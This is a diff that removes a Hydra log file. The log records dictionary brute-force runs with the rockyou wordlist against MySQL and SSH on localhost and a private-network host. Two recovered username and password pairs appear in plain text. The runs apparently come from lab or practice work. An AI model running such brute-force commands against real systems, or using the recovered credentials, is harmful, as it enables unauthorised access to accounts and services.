@@ -1,8 +1,0 @@
-# Hydra v9.5 run at 2023-11-26 14:29:47 on 127.0.0.1 mysql (hydra -l root -P rockyou.txt -t 64 -vV -o output.log -I mysql://127.0.0.1)
-[3306][mysql] host: 127.0.0.1   login: root   password: Cmonster2006
-# Hydra v9.5 run at 2023-11-28 14:30:18 on 127.0.0.1 ssh (hydra -l fam -P rockyou.txt -t 64 -vV -o output.log -I ssh://127.0.0.1)
-# Hydra v9.5 run at 2023-11-28 14:30:45 on 127.0.0.1 ssh (hydra -l fam -P rockyou.txt -t 64 -vV -o output.log -I ssh://127.0.0.1)
-# Hydra v9.5 run at 2023-11-28 15:13:19 on 192.168.1.38 ssh (hydra -l zero -P rockyou.txt -t 64 -vV -o output.log -I ssh://192.168.1.38:22)
-# Hydra v9.5 run at 2023-11-29 11:22:50 on 192.168.1.38 ssh (hydra -l zero -P rockyou.txt -t 64 -vV -o output.log -I ssh://192.168.1.38:22)
-# Hydra v9.5 run at 2023-12-02 15:33:04 on 192.168.1.38 ssh (hydra -l zero -P rockyou.txt -t 64 -vV -o output.log -I ssh://192.168.1.38:22)
-[22][ssh] host: 192.168.1.38   login: zero   password: 945531
